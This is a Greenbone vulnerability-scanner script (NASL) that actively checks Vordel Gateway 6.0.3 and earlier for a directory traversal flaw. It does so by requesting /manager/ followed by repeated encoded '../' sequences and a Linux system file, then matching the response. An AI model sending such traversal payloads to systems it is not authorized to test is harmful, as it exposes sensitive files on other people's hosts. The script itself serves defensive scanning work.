# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103163");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-05-31 13:49:33 +0200 (Tue, 31 May 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Vordel Gateway <= 6.0.3 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8090);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Vordel Gateway is prone to a directory traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"A remote attacker could exploit this vulnerability using
  directory traversal strings (such as '../') to gain access to arbitrary files on the targeted
  system.");

  script_tag(name:"impact", value:"This may result in the disclosure of sensitive information or
  lead to a complete compromise of the affected computer.");

  script_tag(name:"affected", value:"Vordel Gateway version 6.0.3 and prior.");

  script_tag(name:"solution", value:"Reportedly, the issue is fixed. However, Symantec has not
  confirmed this. Please contact the vendor for more information.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47975");
  script_xref(name:"URL", value:"https://web.archive.org/web/20130908024536/http://www.upsploit.com/index.php/advisories/view/UPS-2011-0023");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port( default:8090 );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = str_replace( find:"/", string:file, replace:"%2f" );

  url = "/manager/" + crap( data:"..%2f", length:9*5 ) + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
